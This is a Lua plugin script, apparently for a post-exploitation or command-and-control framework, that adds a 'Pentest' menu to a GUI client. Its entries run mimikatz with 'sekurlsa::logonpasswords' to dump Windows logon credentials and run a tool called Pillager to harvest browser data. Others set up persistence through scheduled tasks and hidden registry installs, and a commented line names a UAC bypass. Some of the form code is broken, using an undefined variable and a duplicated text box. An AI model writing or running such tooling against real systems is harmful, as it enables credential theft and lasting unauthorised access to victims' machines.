-- 获取当前脚本的完整路径
local scriptPath = debug.getinfo(1, "S").source

-- 检查是否成功获取路径
if scriptPath:sub(1, 1) == "@" then
    scriptPath = scriptPath:sub(2)
else
    -- 如果不能获取正确路径，使用备用方法
    scriptPath = arg and arg[0] or "."
end

-- 提取目录路径
local scriptDir = scriptPath:match("(.*/)")
if scriptDir == nil then
    -- 处理 Windows 上的反斜杠路径
    scriptDir = scriptPath:match("(.*\\)")
end

if scriptDir == nil then
    MessageBoxA("Error: Failed to determine script directory")
else
    -- 拼接 Plugins 目录路径
    local pluginsDir = scriptDir .. "Plugins/"


    -- 遍历 Plugins 目录下的所有文件
    local pfile = io.popen('dir "' .. pluginsDir .. '" /b')
    for filename in pfile:lines() do
        if filename:match("%.lua$") then
            local filePath = pluginsDir .. filename
            print("Loading: " .. filePath) -- 调试输出
            dofile(filePath)
        end
    end
    pfile:close()
end

local function SchTaskForm()
    local IsOK = false
    local Form1 = CreateForm("sch", 450, 380)

    local Label1 = Addlabel(Form1, "Interval(min):", 17, 33, 133, 25)
    local Label2 = Addlabel(Form1, "Select File:", 31, 103, 114, 25)
    local Label3 = Addlabel(Form1, "Directory:", 28, 174, 114, 25)

    local addButton = AddSelectFileButton(Form1, "Select", 162, 100, 181, 33)
    local texBox1 = AddTextBox(Form1, 162, 31, 181, 33)
    local ComBox1 = AddComBox(Form1, 162, 174, 181, 33)
    local Button1 = AddButton(Form1, "Ok", 36, 234, 106, 37, function()
        if texBox1.Text ~= "" and ComBox1.Text ~= "" and addButton.Text ~=
            "Select" then -- The values of texBox1 and ComBox1 can't be empty strings, otherwise this window
            IsOK = true
            Form1:Hide()

        else
            IsOK = false
            MessageBoxA("adas")
        end
    end)

    local Button2 = AddButton(Form1, "close", 236, 234, 107, 37,
                              function() Form1:Close() end)
    Form1:ShowDialog()
    if IsOK then
        local FileName = GetFileName(addButton.Text)
        local UploadFilePath = ComBox1.Text .. "\\" .. FileName
        Upload(UploadFilePath, addButton.Text)
        -- InlineAssembly("Plugins\\BypassUAC-ETV.exe", "Plugins\\BypassUAC-ETV.exe", texBox1.Text)
    end
end

local function RegistryForm()
    local IsOK = false
    local Form1 = CreateForm("sch", 470, 295)

    local Label1 = Addlabel(Form1, "File Path:", 17, 33, 133, 25)
    local Label2 = Addlabel(Form1, "Arguments:", 17, 103, 114, 25)
    local texBox1 = AddTextBox(Form1, 162, 100, 181, 33)
    --local addButton = AddSelectFileButton(Form1, "Select", 162, 30, 181, 33)
    local texBox1 = AddTextBox(Form1, 162, 30, 181, 33)
    local texBox2 = AddTextBox(Form1, 162, 100, 181, 33)

    local OkButton = AddButton(Form1, "Ok", 36, 174, 106, 37, function()
        if addButton.Text ~= "Select" and texBox1.Text ~= "" then
            -- 确保文件路径和参数都不为空
            IsOK = true
            Form1:Hide()
        else
            IsOK = false
            MessageBoxA("Please fill in all fields.")
        end
    end)

    local CloseButton = AddButton(Form1, "Close", 236, 174, 107, 37, function()
        Form1:Close()
    end)

    Form1:ShowDialog()

    if IsOK then
        Sessionlog()
        local FileName = GetFileName(addButton.Text)
        local FilePath = addButton.Text
        local Arguments = texBox1.Text
        -- 这里可以添加你想要执行的操作，例如上传文件或执行命令
        -- Upload(FilePath, FileName)
        -- InlineAssembly(FilePath, FilePath, Arguments)
    end
end



local function logonpasswords()
    RunPE(mimikatz, "privilege::debug sekurlsa::logonpasswords exit")
    Sessionlog("Task to run mimikatz , args is 'privilege::debug sekurlsa::logonpasswords exit'")
end

local function PillagerFunc()
    ExecuteAssembly(Pillager, "")
    Sessionlog("Task to run Pillager , args is ''")
end


local function AddMenuItem()
    AddMenuItemA("Pentest", null)
    AddMenuItemA("CollectInfo", null)
    AddMenuItemB("GetBrowser", null, PillagerFunc)
    AddMenuItemB("logonpasswords", null, logonpasswords)
    AddMenuItemA("Persistence", null)
    AddMenuItemA("Scheduled", null)
    AddMenuItemA("Registry", null)
    AddMenuItemB("Install", null,RegistryForm)
    AddMenuItemB("HideInstall", "", RegistryForm)
    AddMenuItemB("Privilege", null)
    AddMenuItemA("4.0", null)
    local menuStructure = {
        ["Pentest"] = { "CollectInfo", "Persistence", "Privilege" }, --一级菜单
        ["CollectInfo"] = { "GetBrowser", "logonpasswords" },        --二级菜单
        ["Persistence"] = { "Scheduled","Registry" },
        ["Scheduled"] = { "Install" },
         ["Registry"] = { "HideInstall" },
        ["Privilege"] = { "4.0" }
    }

    --整理菜单栏层级结构
    for parent, subs in pairs(menuStructure) do
        AddMenuItemsAsSubItems(parent, subs)
    end
end

AddMenuItem()
